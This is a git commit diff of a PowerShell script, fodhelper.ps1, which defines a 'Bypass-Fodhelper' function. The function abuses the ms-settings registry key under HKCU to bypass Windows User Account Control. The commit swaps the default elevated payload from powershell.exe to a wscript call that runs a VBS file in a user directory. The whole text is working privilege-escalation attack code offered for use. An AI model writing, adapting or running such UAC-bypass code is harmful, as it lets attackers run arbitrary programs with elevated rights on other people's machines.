8301111f04afe3549f34fc4e23bb50e19b063e98
AKSHAT Singh <84120105+ShorterKing@users.noreply.github.com>
2025-03-26 23:20:05 +0530

    Update fodhelper.ps1

--- fodhelper.ps1
+++ fodhelper.ps1
@@ -1,5 +1,5 @@
 function Bypass-Fodhelper {
-    param($x='powershell.exe') #You can also use your own programs but use the full path
+    param($x='wscript "C:\Users\roshan\System\script.vbs"') #You can also use your own programs but use the full path
 
     $h='HKCU:\Software\Classes\ms-settings\Shell\Open\command'
     Invoke-Expression "New-Item '$h' -Force"
